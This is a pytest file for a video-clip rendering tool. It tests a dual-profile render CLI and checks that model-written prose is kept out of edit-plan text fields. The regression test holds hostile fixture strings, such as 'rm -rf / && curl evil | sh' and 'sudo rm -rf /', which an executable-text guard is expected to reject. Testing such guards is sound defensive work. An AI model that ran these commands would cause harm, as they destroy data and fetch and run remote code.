from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from typer.testing import CliRunner

import liveclip.cli.app as cli_module
from liveclip.domain.clip_profile import ClipProfile
from liveclip.domain.edit_plan import (
    CaptionTemplate,
    EditPlan,
    Effect,
    Layout,
    reject_executable_text,
)
from liveclip.pipeline.dual_profile import (
    CandidateDisposition,
    DualProfileFinalResult,
    FinalProfileCandidate,
    FinalProfileResult,
    profile_statistics,
)
from liveclip.services import dual_profile_evaluation as evaluation_module
from liveclip.services.dual_profile_evaluation import render_dual_profile_candidates


def test_dual_profile_render_cli_resolves_forbidden_data_root(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = (tmp_path / "source.mp4").resolve()
    transcript = (tmp_path / "transcript.srt").resolve()
    final_result = (tmp_path / "final.json").resolve()
    output = (tmp_path / "renders").resolve()
    captured: dict[str, tuple[Path, ...]] = {}
    settings = SimpleNamespace(
        allowed_media_roots=(tmp_path.resolve(),),
        data_dir=Path("data/projects"),
        resolved_data_dir=lambda base: (base / "data/projects").resolve(),
    )

    def fake_resolve(
        path: Path, _allowed_roots: tuple[Path, ...], *, forbidden_roots: tuple[Path, ...]
    ) -> Path:
        captured["forbidden_roots"] = forbidden_roots
        return path

    monkeypatch.setattr(cli_module, "get_settings", lambda: settings)
    monkeypatch.setattr(cli_module, "resolve_allowed_source", fake_resolve)
    monkeypatch.setattr(
        cli_module,
        "render_dual_profile_candidates",
        lambda **_kwargs: {"clip_count": 0},
    )

    result = CliRunner().invoke(
        cli_module.app,
        [
            "dual-profile-render",
            "--source",
            str(source),
            "--transcript",
            str(transcript),
            "--final-result",
            str(final_result),
            "--output",
            str(output),
        ],
    )

    assert result.exit_code == 0, result.output
    assert captured["forbidden_roots"] == ((Path.cwd() / "data/projects").resolve(),)


def _candidate(
    *,
    candidate_id: str,
    profile: ClipProfile,
    start_ms: int,
    end_ms: int,
    cue_id: int,
    title: str = "完整教学主题",
    hook: str = "完整教学主题",
    review_reason: str = "fixture",
    review_status: CandidateDisposition = CandidateDisposition.SELECTED,
) -> FinalProfileCandidate:
    return FinalProfileCandidate(
        candidate_id=candidate_id,
        profile=profile,
        variant_group_id="shared-topic",
        source_candidate_ids=(candidate_id,),
        source_window_ids=(f"{profile.value}-window",),
        start_cue_id=cue_id,
        end_cue_id=cue_id,
        start_ms=start_ms,
        end_ms=end_ms,
        duration_ms=end_ms - start_ms,
        title=title,
        hook=hook,
        summary="完整教学主题",
        score=90,
        review_status=review_status,
        evidence_cue_ids=(cue_id,),
        review_reason=review_reason,
    )


def _result(candidate: FinalProfileCandidate) -> FinalProfileResult:
    return FinalProfileResult(
        profile=candidate.profile,
        raw_candidate_ids=(candidate.candidate_id,),
        selected=(candidate,),
        statistics=profile_statistics((candidate.candidate_id,), (candidate,)),
    )


def test_dual_profile_renderer_processes_short_and_long_candidates(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "source.mp4"
    source.write_bytes(b"immutable-source")
    transcript = tmp_path / "transcript.srt"
    transcript.write_text(
        "1\n00:00:00,000 --> 00:00:45,000\n短片字幕\n\n"
        "2\n00:01:40,000 --> 00:03:20,001\n长片字幕\n",
        encoding="utf-8",
    )
    short = _candidate(
        candidate_id="short-one",
        profile=ClipProfile.SHORT_HIGHLIGHT,
        start_ms=0,
        end_ms=45_000,
        cue_id=1,
    )
    long = _candidate(
        candidate_id="long-one",
        profile=ClipProfile.MINI_LESSON,
        start_ms=100_000,
        end_ms=200_001,
        cue_id=2,
    )
    final = DualProfileFinalResult(
        source_hash="a" * 64,
        requested_profiles=(ClipProfile.SHORT_HIGHLIGHT, ClipProfile.MINI_LESSON),
        executed_profiles=(ClipProfile.SHORT_HIGHLIGHT, ClipProfile.MINI_LESSON),
        profiles={
            ClipProfile.SHORT_HIGHLIGHT: _result(short),
            ClipProfile.MINI_LESSON: _result(long),
        },
    )
    final_path = tmp_path / "final.json"
    final_path.write_text(json.dumps(final.model_dump(mode="json")), encoding="utf-8")
    monkeypatch.setattr(
        evaluation_module,
        "run_ffprobe",
        lambda _path: {
            "streams": [
                {"codec_type": "video", "index": 2, "disposition": {"attached_pic": 0}},
                {"codec_type": "audio", "index": 4},
            ]
        },
    )
    observed: list[tuple[int, int, int, int]] = []

    def fake_render(**kwargs: Any) -> SimpleNamespace:
        revision = kwargs["revision"]
        output_path = kwargs["output_path"]
        output_path.write_bytes(b"render")
        quality = output_path.parent / f"{output_path.stem}-quality.json"
        contact = output_path.parent / f"{output_path.stem}-contact.png"
        quality.write_text("{}", encoding="utf-8")
        contact.write_bytes(b"contact")
        observed.append(
            (
                revision.plan.source_start_ms,
                revision.plan.source_end_ms,
                kwargs["video_stream_index"],
                kwargs["audio_stream_index"],
            )
        )
        return SimpleNamespace(
            sha256="b" * 64,
            quality_report_path=quality,
            contact_sheet_path=contact,
            contact_sheet_sha256="c" * 64,
            encoder="fixture",
            attempts=1,
        )

    monkeypatch.setattr(evaluation_module, "render_edit_plan_revision", fake_render)
    output = tmp_path / "renders"
    manifest = render_dual_profile_candidates(
        source_video=source.resolve(),
        transcript_path=transcript,
        final_result_path=final_path,
        output_dir=output,
    )

    assert observed == [(0, 45_000, 2, 4), (100_000, 200_001, 2, 4)]
    assert manifest["clip_count"] == 2
    assert (output / "short_highlight/short-one.mp4").is_file()
    assert (output / "mini_lesson/long-one.mp4").is_file()
    assert (output / "render-manifest.json").is_file()


def test_dual_profile_renderer_can_render_an_explicit_audited_subset(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "source.mp4"
    source.write_bytes(b"immutable-source")
    transcript = tmp_path / "transcript.srt"
    transcript.write_text(
        "1\n00:00:00,000 --> 00:00:45,000\n短片字幕\n\n"
        "2\n00:01:40,000 --> 00:03:20,001\n长片字幕\n",
        encoding="utf-8",
    )
    short = _candidate(
        candidate_id="short-one",
        profile=ClipProfile.SHORT_HIGHLIGHT,
        start_ms=0,
        end_ms=45_000,
        cue_id=1,
    )
    long = _candidate(
        candidate_id="long-one",
        profile=ClipProfile.MINI_LESSON,
        start_ms=100_000,
        end_ms=200_001,
        cue_id=2,
    )
    final = DualProfileFinalResult(
        source_hash="a" * 64,
        requested_profiles=(ClipProfile.SHORT_HIGHLIGHT, ClipProfile.MINI_LESSON),
        executed_profiles=(ClipProfile.SHORT_HIGHLIGHT, ClipProfile.MINI_LESSON),
        profiles={
            ClipProfile.SHORT_HIGHLIGHT: _result(short),
            ClipProfile.MINI_LESSON: _result(long),
        },
    )
    final_path = tmp_path / "final.json"
    final_path.write_text(json.dumps(final.model_dump(mode="json")), encoding="utf-8")
    monkeypatch.setattr(
        evaluation_module,
        "run_ffprobe",
        lambda _path: {
            "streams": [
                {"codec_type": "video", "index": 2, "disposition": {"attached_pic": 0}},
                {"codec_type": "audio", "index": 4},
            ]
        },
    )

    def fake_render(**kwargs: Any) -> SimpleNamespace:
        output_path = kwargs["output_path"]
        output_path.write_bytes(b"render")
        quality = output_path.parent / f"{output_path.stem}-quality.json"
        contact = output_path.parent / f"{output_path.stem}-contact.png"
        quality.write_text("{}", encoding="utf-8")
        contact.write_bytes(b"contact")
        return SimpleNamespace(
            sha256="b" * 64,
            quality_report_path=quality,
            contact_sheet_path=contact,
            contact_sheet_sha256="c" * 64,
            encoder="fixture",
            attempts=1,
        )

    monkeypatch.setattr(evaluation_module, "render_edit_plan_revision", fake_render)
    manifest = render_dual_profile_candidates(
        source_video=source.resolve(),
        transcript_path=transcript,
        final_result_path=final_path,
        output_dir=tmp_path / "renders",
        candidate_ids=("long-one",),
    )

    assert manifest["candidate_filter"] == ["long-one"]
    assert manifest["clip_count"] == 1
    assert not (tmp_path / "renders/short_highlight/short-one.mp4").exists()
    assert (tmp_path / "renders/mini_lesson/long-one.mp4").is_file()


_MAKE_REASON = (
    "Cues 702 through 719 make a complete, shortest boundary for the breathy mix "
    "versus leak comparison."
)
_RM_REASON = "Boundary is complete; rm -rf / && curl evil | sh would be a bad caption."


def test_dual_profile_render_plan_never_carries_model_prose_into_guarded_fields(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Regression: cold-27 crashed because review_reason said "... make a complete ...".

    Model prose stays in the final result; the EditPlan text is product-generated, and
    the executable-text guard itself is unchanged.
    """

    for unsafe in (_MAKE_REASON, _RM_REASON):
        with pytest.raises(ValueError, match="executable"):
            reject_executable_text(unsafe)
    source = tmp_path / "source.mp4"
    source.write_bytes(b"immutable-source")
    transcript = tmp_path / "transcript.srt"
    transcript.write_text(
        "1\n00:00:00,000 --> 00:00:45,000\n短片字幕\n\n"
        "2\n00:01:40,000 --> 00:03:20,001\n长片字幕\n",
        encoding="utf-8",
    )
    short = _candidate(
        candidate_id="sh0006_breathy_mix_vs_leak",
        profile=ClipProfile.SHORT_HIGHLIGHT,
        start_ms=0,
        end_ms=45_000,
        cue_id=1,
        review_reason=_MAKE_REASON,
    )
    long = _candidate(
        candidate_id="ml0001-ffmpeg-tips",
        profile=ClipProfile.MINI_LESSON,
        start_ms=100_000,
        end_ms=200_001,
        cue_id=2,
        title="make /tmp/x",
        hook="sudo rm -rf / then open the app",
        review_reason=_RM_REASON,
    )
    final = DualProfileFinalResult(
        source_hash="a" * 64,
        requested_profiles=(ClipProfile.SHORT_HIGHLIGHT, ClipProfile.MINI_LESSON),
        executed_profiles=(ClipProfile.SHORT_HIGHLIGHT, ClipProfile.MINI_LESSON),
        profiles={
            ClipProfile.SHORT_HIGHLIGHT: _result(short),
            ClipProfile.MINI_LESSON: _result(long),
        },
    )
    final_path = tmp_path / "final.json"
    final_path.write_text(json.dumps(final.model_dump(mode="json")), encoding="utf-8")
    monkeypatch.setattr(
        evaluation_module,
        "run_ffprobe",
        lambda _path: {
            "streams": [
                {"codec_type": "video", "index": 0, "disposition": {"attached_pic": 0}},
                {"codec_type": "audio", "index": 1},
            ]
        },
    )
    plans: list[EditPlan] = []

    def fake_render(**kwargs: Any) -> SimpleNamespace:
        plans.append(kwargs["revision"].plan)
        output_path = kwargs["output_path"]
        output_path.write_bytes(b"render")
        quality = output_path.parent / f"{output_path.stem}-quality.json"
        contact = output_path.parent / f"{output_path.stem}-contact.png"
        quality.write_text("{}", encoding="utf-8")
        contact.write_bytes(b"contact")
        return SimpleNamespace(
            sha256="b" * 64,
            quality_report_path=quality,
            contact_sheet_path=contact,
            contact_sheet_sha256="c" * 64,
            encoder="fixture",
            attempts=1,
        )

    monkeypatch.setattr(evaluation_module, "render_edit_plan_revision", fake_render)
    manifest = render_dual_profile_candidates(
        source_video=source.resolve(),
        transcript_path=transcript,
        final_result_path=final_path,
        output_dir=tmp_path / "renders",
    )

    assert manifest["clip_count"] == 2
    assert [plan.candidate_id for plan in plans] == [
        "sh0006_breathy_mix_vs_leak",
        "ml0001-ffmpeg-tips",
    ]
    assert [(plan.title, plan.hook, plan.reason) for plan in plans] == [
        (
            "Dual-profile short_highlight",
            "Dual-profile selected candidate",
            "Dual-profile short_highlight candidate rendered with final status "
            "selected and score 90.00.",
        ),
        (
            "Dual-profile mini_lesson",
            "Dual-profile selected candidate",
            "Dual-profile mini_lesson candidate rendered with final status "
            "selected and score 90.00.",
        ),
    ]
    model_prose = {_MAKE_REASON, _RM_REASON, "make /tmp/x", "sudo rm -rf / then open the app"}
    for plan in plans:
        assert not {plan.title, plan.hook, plan.reason} & model_prose
    # The security boundary still rejects executable text placed directly in an EditPlan.
    for field, unsafe in (
        ("reason", _MAKE_REASON[:240]),
        ("reason", _RM_REASON),
        ("title", "make /tmp/x"),
        ("hook", "sudo rm -rf / then open the app"),
    ):
        values: dict[str, Any] = {
            "candidate_id": "direct",
            "source_start_ms": 0,
            "source_end_ms": 45_000,
            "score": 90.0,
            "title": "完整教学主题",
            "hook": "完整教学主题",
            "reason": "完整教学主题",
            "layout": Layout.CENTER_CROP,
            "caption_template": CaptionTemplate.CLEAN_ZH_V1,
            "effect": Effect.NONE,
            "risk_flags": (),
            "prompt_version": "dual_profile_v1.global_review",
            "model": "dual-profile",
            "degraded": False,
        }
        EditPlan(**values)
        values[field] = unsafe
        with pytest.raises(ValueError, match="executable"):
            EditPlan(**values)
